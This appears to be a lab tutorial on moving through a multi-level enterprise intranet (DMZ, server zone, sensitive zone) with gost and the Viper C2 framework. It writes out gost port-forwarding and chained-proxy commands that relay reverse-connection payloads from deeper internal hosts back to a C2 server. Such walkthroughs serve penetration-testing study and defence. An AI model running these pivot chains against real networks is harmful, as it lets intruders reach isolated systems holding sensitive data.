# Multi-level intranet penetration (gost&viper)

## What is a multi-level intranet
The multi-level intranet mentioned in the title is common in various large enterprises. For example, the following figure

![1630550347634-baccb576-4eec-48a5-bb6a-e84491c56502.webp](./img/zA3VWU0fC_2gXbKF/1630550347634-baccb576-4eec-48a5-bb6a-e84491c56502-926401.webp)

Network A is generally the DMZ area of ​​the enterprise, with external web servers, dns servers, etc.

The B network is generally the server area of ​​the enterprise intranet, which contains domain control servers, intranet OA, etc.

The C network is generally a red zone of enterprises, with databases for sensitive information storage or various key business servers. (such as hospital HIS, industrial controllers, etc.)

In this network, Network A can connect to the Internet, Network B can connect to Network A and Network C but cannot connect to the Internet, Network C can only connect to Network B.



## Viper and gost combine to penetrate multi-level intranet
The network configuration of the experimental environment is as follows:

![1630551064214-97c362b5-df0b-4020-9137-08009c9e87ba.webp](./img/zA3VWU0fC_2gXbKF/1630551064214-97c362b5-df0b-4020-9137-08009c9e87ba-752405.webp)

+ Online 192.168.146.1

![1633519701641-4158f4eb-b5a7-41ed-9248-ab5b87f6f7f3.webp](./img/zA3VWU0fC_2gXbKF/1633519701641-4158f4eb-b5a7-41ed-9248-ab5b87f6f7f3-609141.webp)

+ Use gost to start a port forwarding on 192.168.146.1, forwarding traffic of 192.168.146.1:2000 to 192.168.146.130:2000

```plain
gost.exe -L=tcp://:2000/192.168.146.130:2000
```

![1633519969293-8bd71c1e-97c3-4652-9f08-1f6a1d7e0bbc.webp](./img/zA3VWU0fC_2gXbKF/1633519969293-8bd71c1e-97c3-4652-9f08-1f6a1d7e0bbc-535294.webp)

+ 146.11 executes back-connection to payload at 146.1:2000, 146.11 is online (you can see that it is back-connection through 146.1)

![1633521049030-5a70991f-60c8-427d-9e2a-3abcd8668377.webp](./img/zA3VWU0fC_2gXbKF/1633521049030-5a70991f-60c8-427d-9e2a-3abcd8668377-203485.webp)



+ Going online at 146.12 is quite complicated. First, use gost to start a proxy on 146.1:8080

```plain
gost.exe -L :8080
```

![1633521265187-b601d41b-b54e-4e98-bb70-624c0b608f03.webp](./img/zA3VWU0fC_2gXbKF/1633521265187-b601d41b-b54e-4e98-bb70-624c0b608f03-791533.webp)

+ Then start port forwarding on 146.11, and the traffic passes through the proxy 146.1:8080

```plain
gost.exe -L=tcp://:2000/192.168.146.130:2000 -F 192.168.146.1:8080
```

![1633521438835-3074d19b-c71e-4df8-8156-30ef7bff3c29.webp](./img/zA3VWU0fC_2gXbKF/1633521438835-3074d19b-c71e-4df8-8156-30ef7bff3c29-277139.webp)

+ 146.12 executes back-connection to payload at 146.11:2000, 146.12 is online (you can see that 146.12 is back-connection through 146.1)

![1633521514340-eba95781-9291-44f1-b5d5-47709d981332.webp](./img/zA3VWU0fC_2gXbKF/1633521514340-eba95781-9291-44f1-b5d5-47709d981332-116980.webp)



+ After the payload of 146.12 is connected to port 2000 of 146.11, the gost of 146.11 will add the traffic to the proxy header, and then send it to the proxy 146.1:8080. The proxy header is parsed by the proxy header, and finally send the traffic to 146.130:2000.
